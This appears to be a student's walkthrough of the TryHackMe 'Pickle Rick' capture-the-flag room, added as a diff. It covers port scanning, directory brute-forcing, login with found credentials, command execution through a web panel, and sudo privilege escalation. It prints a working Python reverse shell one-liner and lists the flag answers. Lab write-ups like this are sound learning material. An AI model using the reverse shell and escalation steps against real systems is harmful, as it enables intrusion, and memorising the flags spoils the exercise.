@@ -1,0 +1,130 @@
+All steps and concepts about CTF Pickle Rick https://tryhackme.com/room/mrrobot
+
+1 - Conect to VPN 
+
+2 - Make PortScaning with 'nmap'
+
+    nmap 10.10.92.224 (basic)
+
+    returns:
+    PORT   STATE SERVICE
+    22/tcp open  ssh
+    80/tcp open  http
+
+    nmap -sV -p 22,80 10.10.92.224 (-sV softwares' version,-p especify ports to quick result)
+
+    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+    
+3 - So, there is a webpage on http://10.10.92.224/ with Theme of CTF Pickle Rick
+
+4 - Orientation: see the source code of webpage
+
+    On source coud, there is a comment saying about a username 'R1ckRul3s'
+
+5 - List all folders and paths that can exists on IP with Gobuster
+
+    It can be done with many 'tools' like dirb (used easyctf), in this case, we'll use 'gobuster'
+
+    First , go into wordlist directory 
+    
+    cd "/usr/share/wordlists/dirbuster"
+
+    gobuster dir -u http://10.10.92.224/ -w directory-list-2.3-medium.txt -x php, html, txt
+
+    (dir for directories, -u where is the target IP, -w the file of wordlist, -x extentions of files *optional)
+
+    returns:
+
+    /login.php            (Status: 200) [Size: 882]
+    /assets               (Status: 301) [Size: 313] [--> http://10.10.92.224/assets/]
+    /portal.php           (Status: 302) [Size: 0] [--> /login.php]
+
+6 - On /robots.txt is the password for username founded on comment of source code of webpage
+
+7 - Log in /login.php   
+
+    username 'R1ckRul3s'
+    password 'Wubbalubbadubdub'
+
+8 - You'll be redirect to /portal.php. It has a command panel to execute any command linux like 'ls'/'cd' ....
+
+9 - This 'command panel' is called as RCE - Remote Code execution
+
+    It can have some failures to execute any system code using this 'command panel'
+
+    And it need be explored
+
+10 - If you list the current directory the command panel is , returns:
+
+    Sup3rS3cretPickl3Ingred.txt
+    assets
+    clue.txt
+    denied.php
+    index.html
+    login.php
+    portal.php
+    robots.txt
+
+11 - If you try get content Sup3rS3cretPickl3Ingred.txt with cat, you dont have permission, it is disabled
+
+    but the command less works, and returns 
+
+    'mr. meeseek hair'
+
+    This is the firt flag of CTF
+
+12 - Try make Reverse Shell in the target - Tune connection
+    
+    On revshells.com , we can generate a lot of examples by any language to do it. In this case we'll use python3 because command panel has python3 installed
+
+    Open a port of your machine (machine of tryhackme and not of virtualbox) to be access by, with catnet
+
+    nc -nlv 3333
+
+    The command in python to access
+
+    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.25.96",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+
+    Execute this command into command panel of portal.php, it'll make connection between tryhackme machine and command panel
+
+13 - After make connection between tryhackme machine and aplication , Explore the directories
+
+    In /home 
+
+    There is one '/rick' with /ubuntu , go to /rick
+
+14 - In this folder there is a file , that content the second flag
+
+    cat "second ingredients"
+
+    1 jerry tear
+
+15 - The next step is 'Escalate Privileges'
+
+    Find some program  that can be executed like root user:
+
+    sudo -l
+
+    It return that user 'www-data' has acess to execute anything (ALL) NOPASSWD: ALL
+
+    sudo bash -i
+
+    whoami return you're now root
+
+16 - Go to /root and ls
+
+    Returns a 3rd.txt file contents third flag of CTF:
+
+    cat 3rd.txt
+
+    "3rd ingredients: fleeb juice"
+
+Concepts:
+
+#PortScaning
+#Gobuster - list directories
+#RCE - Remote Code Execution
+#Reverse Shell / tune connection
+#Escalate Privileges
